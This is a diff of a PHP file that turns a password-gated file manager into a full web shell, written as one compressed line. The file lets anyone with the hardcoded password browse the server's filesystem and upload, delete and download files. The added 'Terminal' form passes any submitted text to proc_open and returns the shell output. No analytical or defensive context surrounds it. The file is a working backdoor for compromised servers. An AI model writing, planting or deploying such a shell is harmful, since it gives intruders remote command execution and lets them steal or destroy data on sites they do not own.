@@ -1,31 +1,3 @@
 <?php
-session_start();
-$pass="asikinaja";
-
-// login
-if(isset($_POST['p']) && $_POST['p']===$pass){$_SESSION['ok']=1;}
-if(isset($_GET['out'])){session_destroy();header("Location:?");exit;}
-if(!isset($_SESSION['ok'])){echo '<form method=post>Password:<input type=password name=p><input type=submit></form>';exit;}
-
-// path
-$path=realpath($_GET['d']??__DIR__);
-
-// upload
-if(!empty($_FILES['f']['tmp_name'])) move_uploaded_file($_FILES['f']['tmp_name'],$path."/".$_FILES['f']['name']);
-
-// delete
-if(isset($_GET['del'])) unlink($path."/".basename($_GET['del']));
-
-// list
-$files=scandir($path);
-?>
-<!doctype html><html><body style="background:black;color:lime;font-family:monospace">
-<b>Path:</b> <?=$path?> | <a href="?out=1" style="color:red">Logout</a><hr>
-<form method=post enctype=multipart/form-data>
-<input type=file name=f><input type=submit value=Upload>
-</form><hr><ul>
-<?php foreach($files as $f){ if($f==".")continue; $fp=$path."/".$f;
-if(is_dir($fp)) echo "<li>[DIR] <a href='?d=".urlencode($fp)."'>$f</a></li>";
-else echo "<li>[FILE] $f <a href='?d=".urlencode($path)."&del=".urlencode($f)."' style=color:red>Delete</a> <a href='$fp' style=color:cyan target=_blank>Download</a></li>";
-} ?>
-</ul></body></html>
+session_start();$pass="asikinaja";if(isset($_POST['p'])&&$_POST['p']===$pass)$_SESSION['ok']=1;if(isset($_GET['out'])){session_destroy();header("Location:?");exit;}if(!isset($_SESSION['ok'])){echo'<form method=post>Password:<input type=password name=p><input type=submit></form>';exit;}$path=realpath($_GET['d']??__DIR__);if(!empty($_FILES['f']['tmp_name']))move_uploaded_file($_FILES['f']['tmp_name'],$path."/".$_FILES['f']['name']);if(isset($_GET['del']))unlink($path."/".basename($_GET['del']));$o="";if(isset($_POST['cmd'])&&$_POST['cmd']!==''){$c=$_POST['cmd'];$w=$_POST['cwd']??$path;if(!is_dir($w))$w=$path;$d=[1=>['pipe','w'],2=>['pipe','w']];$p=proc_open("cd ".escapeshellarg($w)." && ".$c,$d,$pp);if(is_resource($p)){$o.=stream_get_contents($pp[1]);$o.=stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);}else$o="Gagal\n";if(trim($o)==='')$o="(no output)";}$files=scandir($path);?>
+<!doctype html><html><body style="background:#000;color:#0f0;font-family:monospace"><b>Path:</b> <?=$path?> | <a href="?out=1" style="color:red">Logout</a><hr><form method=post enctype=multipart/form-data><input type=file name=f><input type=submit value=Upload></form><hr><h3 style="color:cyan;margin:5px 0">Terminal</h3><form method=post style="margin-bottom:8px"><input type=hidden name=cwd value="<?=htmlspecialchars($path)?>"><span style="color:yellow"><?=htmlspecialchars($path)?> $</span> <input type=text name=cmd autocomplete=off autofocus style="background:#111;color:#0f0;border:1px solid #333;font-family:monospace;width:60%" placeholder="command..."><input type=submit value=Run style="background:#222;color:cyan;border:1px solid #333"></form><?php if($o!==''):?><pre style="background:#111;border:1px solid #333;padding:8px;max-height:400px;overflow:auto;color:#0f0;white-space:pre-wrap"><?=htmlspecialchars($o)?></pre><?php endif;?><hr><ul><?php foreach($files as $f){if($f==".")continue;$fp=$path."/".$f;if(is_dir($fp))echo"<li>[DIR] <a href='?d=".urlencode($fp)."'>$f</a></li>";else echo"<li>[FILE] $f <a href='?d=".urlencode($path)."&del=".urlencode($f)."' style=color:red>Delete</a> <a href='$fp' style=color:cyan target=_blank>Download</a></li>";}?></ul></body></html>
